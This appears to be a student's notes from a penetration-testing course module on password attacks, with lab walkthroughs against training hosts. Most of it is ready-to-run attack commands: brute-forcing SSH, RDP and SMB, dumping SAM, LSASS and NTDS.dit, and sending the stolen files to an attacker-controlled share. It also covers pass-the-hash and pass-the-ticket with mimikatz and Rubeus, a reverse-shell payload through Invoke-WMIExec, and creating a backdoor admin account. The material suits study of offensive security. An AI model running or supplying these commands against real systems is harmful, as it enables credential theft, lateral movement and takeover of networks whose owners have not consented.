# Password Attacks

1. [Introduction](#introduction)
1. [Remote Password Attacks](#remote-password-attacks)
1. [Windows Local Password Attacks](#windows-local-password-attacks)
1. [Linux Local Password Attacks](#linux-local-password-attacks)
1. [Windows Lateral Movement](#windows-lateral-movement)
1. [Cracking Files](#cracking-files)
1. [Skills Assessment](#skills-assessment)

## Introduction

* Credential storage:

  * Linux:

    * ```/etc/shadow``` -

      * stores encrypted password hashes
      * format - [username]:[encrypted password]:[day of last change]:[min age]:[max age]:[warning period]:[inactivity period]
      * password encryption format - [id]:[salt]:[hash]

    * ```/etc/passwd``` -

      * includes user-info
      * format - [username]:[password]:[uid]:[gid]:[comment]:[home directory]:[login shell]
  
  * Windows:

    * LSA (Local Security Authority) -

      * authenticates users & logs them into the local computer
      * also maintains info about local security
      * provides various services for translating between names & SIDs (security IDs)

    * WinLogon -

      * trusted logon process; for managing security-related user interactions like launching LogonUI to enter passwords at login, changing passwords and locking/unlocking workstation
      * relies on credential providers (COM objects located in DLLs) installed on system to obtain username/password

    * LSASS (Local Security Authority Subsystem Service) -

      * collection of modules; has access to all authentication process in ```%SystemRoot%\System32\Lsass.exe```
      * service responsible for local system security policy, user authentication and sending security audit logs to Event Log

    * SAM (Security Account Manager) database -

      * stores users' passwords; used to authenticate local & remote users
      * passwords stored in hash format in a registry structure; either as LM or NTLM hash
      * located in ```%SystemRoot%\system32\config\SAM``` and mounted on HKLM/SAM
      * SYSTEM level permissions required to view it
      * if system is assigned to workgroup, SAM database is handled locally; if system is joined to domain, DC (Domain Controller) must validate creds from AD database ntds.dit, located at ```%SystemRoot%\ntds.dit```

    * Credential manager -

      * allows users to save creds to access various network resources
      * saved creds are stored based on user profiles in each user's Credential Locker
      * encrypted & stored at ```C:\Users\[username]\AppData\Local\Microsoft\[Vault/Credentials]\```

    * NTDS -

      * in AD environment, DC hosts ```ntds.dit``` that is kept synced across all DCs (except read-only DCs)
      * stores data like user accounts, group accounts, computer accounts, group policy objects, etc.

* JTR (John The Ripper):

  * tool to crack encrypted/hashed passwords
  * uses attacks such as dictionary attacks, brute force attacks, rainbow table attacks, etc.
  * attack modes include single crack mode, wordlist mode, incremental mode
  * can be used to crack files as well with tools like ```pdf2john```, ```ssh2john```, ```rar2john```, ```keepass2john```, ```zip2john```, etc.
  * another way to list these tools is using the command ```locate *2john*```

* For extracting passwords from network traffic, we can use tools like ```wireshark``` and ```pcredz```

## Remote Password Attacks

* Network Services:

  * WinRM (Windows Remote Management):

    * used for remote management of Windows systems; uses TCP/5985, TCP/5986
    * for security reasons, WinRM must be activated & configured manually
    * we can use tools like ```crackmapexec``` and ```evil-winrm``` for attacking WinRM:

      ```sh
      crackmapexec -h

      crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
      # general format

      crackmapexec winrm 10.129.42.197 -u user.list -p password.list

      evil-winrm -i 10.129.42.197 -u user -p password
      # for testing creds found above
      # if it works, we get a PS session
      ```
  
  * SSH (Secure Shell):

    * to connect to a remote host for command execution & file transfer; uses TCP/22
    * uses symmetric & asymmetric encryption, and hashing
    * we can use tools like ```hydra``` for brute force:

      ```sh
      hydra -L user.list -P password.list ssh://10.129.42.197

      # to test creds found above
      ssh user@10.129.42.197
      ```
  
  * RDP (Remote Desktop Protocol):

    * allows remote access to Windows via TCP/3389
    * RDP defines 2 participants - the terminal server and the terminal client
    * ```hydra``` can be used for RDP bruteforcing as well:

      ```sh
      hydra -L user.list -P password.list rdp://10.129.42.197

      # for RDP connection
      xfreerdp /v:10.129.42.197 /u:user /p:password
      ```
  
  * SMB (Server Message Block):

    * for data transfer between client & server in LANs
    * ```hydra``` can be used here again:

      ```sh
      hydra -L user.list -P password.list smb://10.129.42.197
      # if we get an error 'invalid reply from target smb://'
      # this means outdated hydra version for SMBv3 replies
      # in that case we can use Metasploit

      msfconsole -q

      use auxiliary/scanner/smb/smb_login

      options
      # set the required options and run the module

      # we can view the shares using crackmapexec
      crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares

      # we can also use smbclient
      smbclient -U user \\\\10.129.42.197\\SHARENAME
      ```

* Password Mutations:

  * based on company password policies, most common passwords are in the following format:

    * first letter uppercase - ```Password```
    * add numbers - ```Password123```
    * add year - ```Password2022```
    * add month - ```Password02```
    * last char exclamation mark - ```Password2022!```
    * add special chars - ```P@ssw0rd2022!```
  
  * we can use Hashcat for mutations using [custom rules](https://hashcat.net/wiki/doku.php?id=rule_based_attack):

    ```text
    :
    c
    so0
    c so0
    sa@
    c sa@
    c sa@ so0
    $!
    $! c
    $! so0
    $! sa@
    $! c so0
    $! c sa@
    $! so0 sa@
    $! c so0 sa@
    ```

    ```sh
    # create wordlist
    vim password.list
    
    # generate rule-based wordlist
    hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
    ```
  
  * we can also refer inbuilt rules like 'best64.rule'; custom wordlists can also be created from target website using ```CeWL```:

    ```sh
    cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
    # custom wordlist
    # -d for depth to spider, -m for minimum length
    ```

* Password Reuse:

  * Credential stuffing:

    * we can use resources such as [default creds cheatsheet](https://github.com/ihebski/DefaultCreds-cheat-sheet), [default router creds](https://www.softwaretestinghelp.com/default-router-username-and-password-list/), or the product documentation itself for default creds
    * credential stuffing is attacking services using default or obtained creds:

      ```sh
      # credentials separated with colon
      hydra -C user_pass.list ssh://10.129.42.197

      # OSINT used to search for default creds
      ```

## Windows Local Password Attacks

* Attacking SAM:

  * if we have access to a non-domain joined Windows system, we can dump the files associated with SAM database, transfer to our machine and crack hashes offline

  * there are 3 SAM registry hives that can be checked if we have local admin access:

    * ```hklm\sam``` - contains hashes for local account passwords
    * ```hklm\system``` - contains system bootkey (used to encrypt SAM database)
    * ```hklm\security``` - contains cached creds for domain accounts
  
  * copy registry hives using ```reg.exe``` (needs admin priv):

    ```cmd
    reg.exe save hklm\sam C:\sam.save

    reg.exe save hklm\system C:\system.save

    reg.exe save hklm\security C:\security.save
    ```
  
  * then, we can create a share with Impacket's ```smbserver.py``` and move the hive copies:

    ```sh
    # in attacker machine
    sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData ~

    # in target machine
    move sam.save \\10.10.15.16\CompData

    move system.save \\10.10.15.16\CompData

    move security.save \\10.10.15.16\CompData

    # check on attacker machine if hive copies have been moved
    ```
  
  * then, dump the hashes using Impacket's ```secretsdump.py```:

    ```sh
    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
    # also shows the format of hashes - like uid:rid:lmhash:nthash

    # store all hashes in a file
    vim NTLMhashes.txt

    # hashcat for cracking
    hashcat -a 0 -m 1000 NTLMhashes.txt /usr/share/wordlists/rockyou.txt
    ```
  
  * if we have creds with local admin privileges, we can consider remote dumping as well:

    ```sh
    crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
    # dumping LSA secrets remotely

    crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
    # dumping SAM remotely
    ```

* Attacking LSASS:

  * dumping LSASS process memory:

    * if we have GUI access to victim machine, we can use Task Manager to create a memory dump (Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file). A file called ```lsass.DMP``` is saved in ```C:\Users\username\AppData\Local\Temp``` (this can be moved to attacker machine)

    * alternatively, in case of CLI access, we can use tools like ```rundll32.exe``` and ```comsvcs.dll```:

      ```ps
      tasklist /svc
      # find PID of lsass.exe

      # or in PowerShell
      Get-Process lsass
      # get PID

      # with elevated PowerShell session
      rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
      # where 672 is PID of lsass

      # modern AV tools can recognise this as malicious
      ```

  * after moving the dump file to attacker machine, we can use ```pypykatz``` (```Mimikatz``` but in Python, so that it can be run on Linux) to extract creds:

    ```sh
    pypykatz lsa minidump /home/peter/Documents/lsass.dmp
    # lsa refers to LSASS being a subset of LSA
    # data source is a minidump file

    # output from dump includes sections such as MSV, WDIGEST, Kerberos, and DPAPI
    # we can take the NT hashes from these and crack with hashcat
    ```

* Attacking Windows Credential Manager:

  ```sh
  # enumerate creds with cmdkey

  cmdkey /list
  # shows stored creds

  # suppose we have a stored 'domain password' for a user

  runas /savecred /user:SRV01\mcharles cmd
  # to impersonate the stored user

  # we can extract this using mimikatz
  mimikatz.exe

  privilege::debug

  sekurlsa::credman
  # dumps creds

  # we can also use other tools like SharpDPAPI, LaZagne, and DonPAPI
  ```

* Attacking Active Directory & NTDS.dit:

  * dictionary attacks against AD accounts:

    * for usernames, we can consider various username conventions like ```[first-initial][last-name]```, ```[first-initial][middle-initial][last-name]```, ```[first-name][last-name]```, ```[first-name].[last-name]```, ```[last-name].[first-name]``` or even a 'nickname'; email address structure can also show employee username - based on this we can create a custom list of usernames using a tool like [Username Anarchy](https://github.com/urbanadventurer/username-anarchy) as well:

      ```sh
      ./username-anarchy -i names.txt
      ```

    * we can then launch a dictionary attack against target DC:

      ```sh
      crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
      # as account lockout policy is not enforced by default
      # we can try this attack
      ```
  
  * once we have valid creds, we can capture ```NTDS.dit``` - it is the directory service used with AD to find & organize network resources (.dit stands for directory information tree):

    ```ps
    evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
    # connect to DC

    net localgroup
    # check group privs

    # to make a copy of NTDS.dit, we need local admin (Administrators group) or domain admin (Domain Admins group) rights

    net user bwilliamson
    # check user privileges

    # create volume shadow copy of the drive where AD is setup
    vssadmin CREATE SHADOW /For=C:

    # copy NTDS.dit from VSS
    cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

    # setup smbserver share on attacker machine

    # move file from target to attacker machine
    cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
    ```

    ```sh
    # alternatively, we can use crackmapexec to capture NTDS.dit
    crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
    ```
  
  * after this, we can crack the NT hashes to get the creds; if we are unable to crack the hash, we can consider PtH (pass-the-hash) attacks - it takes advantage of the NTLM authentication protocol:

    ```sh
    evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
    # using hash instead of password
    ```

* Credential Hunting in Windows:

  * key words to be searched for while looking for credentials include - 'passwords', 'username', 'users', 'configuration', 'pwd', 'passphrases', 'passkeys', 'dbcredential', 'login', 'keys', 'creds', 'dbpassword', 'credentials', 'user account'

  * if we have GUI access, we can use 'Windows Search' function to search the above keywords; we can also use tools such as ```Lazagne.exe``` to discovers creds stored in apps:

    ```cmd
    # run the tool
    start lazagne.exe all
    ```
  
  * we can also use ```findstr``` for search patterns:

    ```cmd
    findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
    ```

## Linux Local Password Attacks

* Credential Hunting in Linux:

  * commonly creds are found in the following places:

    * files - configs, DBs, notes, scripts, source codes, cronjobs, SSH keys
    * history - logs, CLI history
    * memory - cache, in-memory processing
    * key-rings - browser-stored creds
  
  * searching in files:

    ```sh
    for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
    # for different file extensions
    # shows the config files
    # except for certain keywords like 'lib' and 'fonts'

    for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
    # or we can also consider a type of file
    # and grep for terms like 'user', 'password' and 'pass'

    # to search in DBs
    for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

    # search for text files for any notes
    find /home/* -type f -name "*.txt" -o ! -name "*.*"

    # search in scripts
    for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

    # view cronjobs for any creds
    cat /etc/crontab

    ls -la /etc/cron.*/

    # search for SSH private keys
    grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

    # search for SSH public keys
    grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
    ```
  
  * search history for any creds:

    ```sh
    tail -n5 /home/*/.bash*
    # for files like .bash_history or .bashrc

    for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
    # search in all types of log files
    ```
  
  * searching in memory and cache:

    ```sh
    # we can use a tool like mimipenguin in Linux
    # but it requires root privilege

    sudo python3 mimipenguin.py
    
    sudo bash mimipenguin.sh

    # lazagne can also be used to search for passwords in memory
    sudo python2.7 laZagne.py all
    ```
  
  * search for browser-stored passwords:

    ```sh
    ls -l .mozilla/firefox/ | grep default
    # creds stored in these directories

    cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

    # we can also use firefox_decrypt tool
    python3.9 firefox_decrypt.py

    # lazagne supports browser as well
    python3 laZagne.py browsers
    ```

* Passwd, Shadow & Opasswd:

  * PAM (Pluggable Authentication Modules) is one of the most common authentication mechanism seen in Linux distros; it uses modules like ```pam_unix.so``` or ```pam_unix2.so```, which are also responsible for changing and managing passwords

  * ```/etc/passwd``` contains info on every user on the system, and this file can be read by all - if it is writable, we can modify the field for root user, from ```root:x:0:0:root:/root:/bin/bash``` to ```root::0:0:root:/root:/bin/bash```, such that the system does not prompt for a password when user tries to login as root

  * ```/etc/shadow``` is used for password management, and includes all password info for created users; the encrypted password in this file has a particular format - ```$[type-of-encryption-algo]$[salt]$[hashed]```

  * ```/etc/security/opasswd``` contains old passwords, so that the PAM library can prevent password reuse; this file also requires admin privileges to read

  * if we have access to the above hashes, we can try to crack them:

    ```sh
    sudo cp /etc/passwd /tmp/passwd.bak

    sudo cp /etc/shadow /tmp/shadow.bak

    unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
    # to get them in the right format

    hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
    ```

## Windows Lateral Movement

* Pass the Hash (PtH):

  * attack technique where password hash is used instead of plaintext password for authentication, so there's no need for decryption; it is an attack on authentication protocol

  * NTLM (New Technology LAN Manager) - Window's suite of security protocols for user authentication; it is a SSO (Single Sign-On) solution that uses a challenge-response protocol to verify user identity

  * NTLM is still used for legacy devices, and it stores passwords without 'salting'; Kerberos is the current default authentication mechanism

  * PtH with [mimikatz](https://github.com/gentilkiwi/mimikatz) in Windows:

    ```cmd
    mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
    # sekurlsa:pth - module for PtH
    # /user - username to impersonate
    # /rc4 or /NTLM - hash
    # /domain - domain to which user belongs - if local account, we can use computer name, localhost or .
    # we can get domain name from command 'systeminfo | findstr /B /C:"Domain"'
    # /run - program to run with user context, cmd.exe by default

    # after this we can use cmd.exe to execute commands as that user
    ```
  
  * PtH with PS [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) in Windows:

    ```ps
    # Invoke-TheHash with SMB
    cd C:\tools\Invoke-TheHash\

    Import-Module .\Invoke-TheHash.psd1

    Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
    # -Command - executes the command specified
    # -Target - accepts hostname or IP of target

    # alternatively, Invoke-TheHash with WMI
    Import-Module .\Invoke-TheHash.psd1

    # ensure listener is setup on victim Windows machine, not the attacker machine
    # this is because the target DC01 can only connect to victim Windows machine MS01
    .\nc.exe -nvlp 4445

    # to get the IP, we can run the command 'ipconfig' - the local IP has to be used while building the payload
    Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "<insert PS reverse-shell base64-encoded payload>"
    # payload can be found in revshells, PowerShell #3 (Base64)
    ```
  
  * PtH with Impacket in Linux:

    ```sh
    impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
    # we can also use other tools from Impacket for PtH
    # like impacket-wmiexec, impacket-atexec, impacket-smbexec
    ```
  
  * PtH with CrackMapExec in Linux:

    ```sh
    crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
    # if we have local admin hash and want to check how many hosts can be accessed due to local admin password reuse
    # we can use the --local-auth flag

    # command execution
    crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
    ```
  
  * PtH with evil-winrm in Linux:

    ```sh
    evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
    # when using a domain account, we need to include domain name using @
    ```
  
  * PtH with RDP in Linux:

    ```sh
    # this works only if Restricted Admin Mode, which is disabled by default
    # is enabled on target host

    # to enable Restricted Admin Mode to allow PtH
    # on target Windows machine
    reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

    # on attacker machine
    xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
    ```
  
  * Once we have access to the target as local administrator, we can use tools like ```mimikatz``` to dump more hashes from current session:

    ```sh
    mimikatz.exe

    privilege::debug

    sekurlsa::logonpasswords

    lsadump::sam

    lsadump::lsa /patch

    # from the above, if we get access to a user hash
    # we can do PtH attacks
    # PoC for 'david' user, for example
    dir \\dc01\david
    ```

* PtT (Pass the Ticket) from Windows:

  * attack that uses a stolen Kerberos ticket to move laterally instead of hash

  * TGT (ticket granting ticket) is the first ticket obtained on a Kerberos system, and it permits client to obtain more tickets through TGS (ticket granting service) for using services

  * harvesting Kerberos tickets:

    ```cmd
    # on target Windows
    mimikatz.exe

    privilege::debug

    sekurlsa::tickets /export
    # exports .kirbi files

    exit

    dir *.kirbi
    # these are the required tickets

    # tickets ending with $ are for computer account

    # user tickets have format [username]@[service]-[domain]
    # if service is krbtgt, it is for TGT
    ```

    ```cmd
    # we can also use Rubeus
    Rubeus.exe dump /nowrap
    # dumps tickets in base64
    ```
  
  * Pass the Key or OverPass the Hash:

    * this method converts a hash/key for a domain-joined user into a TGT

    ```cmd
    mimikatz.exe

    privilege::debug

    sekurlsa::ekeys
    # this module will enumerate all key types for Kerberos and dump the keys

    # if we have access to key types like AES256_HMAC or RC4_HMAC, we can perform overpass the hash
    # using Mimikatz, this requires admin privileges
    sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
    # this creates cmd.exe with target user context

    # we can also do the above using Rubeus, without admin rights
    Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
    # asktgt for pass the key or overpass the hash
    # hash format can be /rc4, /aes128, /aes256 or /des
    ```
  
  * Pass the Ticket (PtT):

    ```cmd
    Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
    # /ptt used to submit TGT or TGS ticket to current logon session

    # we can also import a ticket for ptt
    Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
    ```

    ```ps
    # to convert .kirbi to base64 in PS
    [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
    ```

    ```cmd
    # we can also convert .kirbi to base64 and then use it for ptt
    Rubeus.exe ptt /ticket:<base64-ticket>
    ```

    ```cmd
    # perform ptt using mimikatz
    mimikatz.exe

    privilege::debug

    kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"

    misc::cmd
    # launch new cmd window with imported ticket
    # instead of exiting mimikatz.exe to get ticket into current cmd
    ```
  
  * PtT with PowerShell Remoting (required to be member of Remote Management Users group):

    ```cmd
    mimikatz.exe

    privilege::debug

    kerberos::ptt "C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"

    exit

    # now we can launch PS console from same cmd window and connect to target machine
    powershell

    Enter-PSSession -ComputerName DC01
    ```

    ```cmd
    # the same using Rubeus
    Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
    # createnetonly creates a hidden process or logon session

    # this opens a new cmd window
    # we can execute Rubeus here to request a new TGT
    Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt

    powershell

    Enter-PSSession -ComputerName DC01
    ```

* PtT from Linux:

  * in some cases, Linux machines can also connect to AD, so they will also use Kerberos for authentication; Kerberos tickets usually stored as 'ccache' files in ```/tmp```, its location stored in env variable ```KRB5CCNAME```, and ```keytab``` files are used, which contain pairs of Kerberos principals & encrypted keys

  * identifying Linux & AD integration:

    ```sh
    ssh david@inlanefreight.htb@10.129.204.23 -p 2222
    # first we have to connect to the Linux host via port forward
    # port 2222 is for MS01

    realm list
    # realm is a tool for enrolling to domains
    # if AD integration is there, we will get kerberos in output

    # if realm is not installed, we can check other tools like sssd or winbind

    ps -ef | grep -i "winbind\|sssd"
    ```
  
  * finding Kerberos tickets:

    ```sh
    # finding keytab files
    find / -name *keytab* -ls 2>/dev/null
    # to use a keytab file, we need to have rw privilege on file

    crontab -l
    # example - scripts use keytab files for interacting with Windows services
    # these scripts can use tools such as 'kinit' to interact with kerberos
    ```
  
  * finding ccache files:

    ```sh
    # ccache files hold Kerberos creds while valid or till user session lasts

    # check env vars
    env | grep -i krb5

    # check for any krb5cc files
    ls -la /tmp
    ```
  
  * abusing keytab files:

    ```sh
    klist -k -t
    # klist reads info from keytab file

    klist
    # check which ticket is being used

    kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
    # principal and path were found out from klist earlier

    klist
    # now we are using carlos principal

    smbclient //dc01/carlos -k -c ls
    # we can then access a shared folder as carlos

    # if we need to keep ticket from old session
    # before importing keytab, save copy of ccache file from env var KRB5CCNAME
    ```

    ```sh
    # we can also extract keytab hashes with keytabextract tool
    python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
    # this gives us NTLM and AES hashes
    
    # with NTLM hash, we can either crack it or do PtH
    # with AES hash, we can crack hash or forge tickets using Rubeus

    # if we have plaintext password, we can login as that user on the machine
    su - carlos@inlanefreight.htb
    ```

    ```sh
    # if we have root access
    # we can try to check Linux keytab file at default location
    ls -la /etc/krb5.keytab

    python3 /opt/keytabextract.py /etc/krb5.keytab
    # we can try to crack it to get hash

    # or we can use the keytab with kinit
    kinit "LINUX01\$@INLANEFREIGHT.HTB" -k -t /etc/krb5.keytab
    # need to escape the character, without that it will give an error

    klist
    # now we are using the LINUX01 principal

    smbclient //dc01/linux01 -k -c ls
    ```
  
  * abusing keytab ccache:

    ```sh
    # we need read privileges on ccache file, usually only for user who created them
    # so we need root access to abuse them

    ls -la /tmp
    # check for ccache files
    # not all ccache files are valid, so if there are multiple files, we need to check all of them

    id julio@inlanefreight.htb
    # identify group membership for target user
    # part of Domain Admins group

    klist
    # check for current ccache

    cp /tmp/krb5cc_647401106_I8I133 .
    # copy ccache file to current dir

    export KRB5CCNAME=/root/krb5cc_647401106_I8I133
    # assign ccache file path to env var

    klist
    # now we can see newly imported ccache file

    smbclient //dc01/C$ -k -c ls -no-pass
    # if target user is part of Domain Admins group, for example
    # then we can access the Domain Controller
    ```
  
  * using Linux tools to attack Kerberos:

    ```sh
    # for domain-joined machine, we can set KRB5CCNAME env var to required ccache file

    # for a machine that is not a domain member, we need to ensure reachability between attacker and DC
    # we can proxy our traffic to a machine (MS01 in this example) which has reachability to DC
    # using proxy tools like chisel and proxychains

    cat /etc/hosts
    # add IPs of domain and machines to attack - for example
    # 172.16.1.10 inlanefreight.htb   inlanefreight   dc01.inlanefreight.htb  dc01
    # 172.16.1.5  ms01.inlanefreight.htb  ms01

    # modify proxychains config file to use socks5 and port 1080
    vim /etc/proxychains.conf
    # or /etc/proxychains4.conf
    # we can include this under [ProxyList] section
    # socks5 127.0.0.1 1080

    # download and execute chisel
    wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
    gzip -d chisel_1.7.7_linux_amd64.gz
    mv chisel_* chisel && chmod +x ./chisel

    sudo ./chisel server --reverse

    # now we can connect to MS01 and execute chisel server

    # connect to MS01 via RDP
    xfreerdp /v:10.129.204.23 /u:david /d:inlanefreight.htb /p:Password2 /dynamic-resolution

    # execute chisel in MS01
    c:\tools\chisel.exe client 10.10.14.33:8080 R:socks

    # we can transfer target ccache file from LINUX01 to attacker machine and create env var
    # in attacker machine
    export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133

    # we can use Kerberos ticket with impacket now
    # mention target machine name and not IP, use -k
    proxychains impacket-wmiexec dc01 -k
    # to avoid password prompt use -no-pass
    ```

    ```sh
    # we can also use evil-winrm with kerberos instead of impacket
    
    # need to install auth package first
    sudo apt-get install krb5-user -y
    # in prompt for config
    # enter default k5 realm 'INLANEFREIGHT.HTB', kerberos server can be empty, and admin server as 'DC01'

    vim /etc/krb5.conf
    # modify kerberos config file
    # edit 'default_realm' value under [libdefaults] to target domain name "INLANEFREIGHT.HTB"
    # and 'kdc' value under [realms] to target DC with domain included "dc01.inlanefreight.htb"

    # using evil-winrm
    proxychains evil-winrm -i dc01 -r inlanefreight.htb
    ```
  
  * convert ticket formats:

    ```sh
    # we can use impacket-ticketConverter tool

    # convert ccache to kirbi in Linux
    impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi

    # we can then import converted ticket in Windows
    C:\tools\Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
    ```
  
  * [Linikatz](https://github.com/CiscoCXSecurity/linikatz):

    ```sh
    # similar to mimikatz, we need to be root on Linux
    # this extracts all creds

    wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh

    # run linikatz
    /opt/linikatz.sh
    ```

## Cracking Files

* Protected Files:

  * [a list of encoded file formats](https://fileinfo.com/filetypes/encoded) can be referred; most common protected files can be found with this:

    ```sh
    for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
    ```
  
  * hunting for SSH keys:

    ```sh
    grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"

    # if we have a header with encryption type
    # we need to use it with a passphrase
    ```
  
  * cracking SSH keys:

    ```sh
    # we can use John tools
    ssh2john.py SSH.private > ssh.hash

    john --wordlist=rockyou.txt ssh.hash

    john ssh.hash --show
    # show hash
    ```
  
  * cracking MS Office documents:

    ```sh
    office2john.py Protected.docx > protected-docx.hash

    john --wordlist=rockyou.txt protected-docx.hash
    ```
  
  * cracking PDFs:

    ```sh
    pdf2john.py PDF.pdf > pdf.hash

    john --wordlist=rockyou.txt pdf.hash
    ```

* Protected Archives:

  * download all protected compressed file extensions:

    ```sh
    curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
    ```
  
  * cracking zip files:

    ```sh
    zip2john ZIP.zip > zip.hash

    john --wordlist=rockyou.txt zip.hash
    ```
  
  * cracking openSSL encrypted archives:

    ```sh
    file test.gzip
    # openssl encrypted data

    for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null| tar xz;done
    # using for-loop to avoid false positives with OpenSSL

    # after for-loop, we can check if archive has been decompressed
    ```
  
  * cracking BitLocker encrypted drives:

    ```sh
    bitlocker2john -i Backup.vhd > backup.hashes
    # this extracts 4 different hashes
    # to be cracked with different modes

    grep "bitlocker\$0" backup.hashes > backup.hash
    # first hash

    hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked
    # once the password is cracked, we can open the encrypted drives using this password
    # we can transfer the encrypted virtual drive to Windows and mount it
    ```

## Skills Assessment

* Password Attacks Lab - Easy:

  * Map given machine to ```password-attacks-1.htb``` in ```/etc/hosts```

  * Scan given machine - ```nmap -T4 -p- -A -Pn -v password-attacks-1.htb```

  * We have ports 21 and 22 open for FTP and SSH

  * Attempt bruteforce on FTP:

    ```sh
    # from given resources, we have usernames, passwords and a custom rule
    # we can generate a list of mutated passwords
    hashcat --force password.list -r custom.rule --stdout | sort -u > mut_pass.list

    # bruteforce FTP
    # we can first try with normal password list
    # if this does not work, we can use mutated password list
    hydra -L username.list -P password.list ftp://password-attacks-1.htb -t 36 -u
    # -u to check one password for each username, instead of all passwords for one username
    # if we lose session, we can use -R flag to restore/resume

    # if we want to reverse the order of passwords
    # to experiment while bruteforcing, we can use 'tac', opposite of 'cat'
    ```
  
